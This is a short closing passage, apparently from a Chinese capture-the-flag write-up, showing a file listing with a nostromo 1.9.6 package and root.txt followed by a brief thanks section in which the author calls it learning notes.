nostromo_1.9.6-1.deb  root.txt
```

## 0x05 Thanks！

也算是自己边学边记录，望大佬手下留情~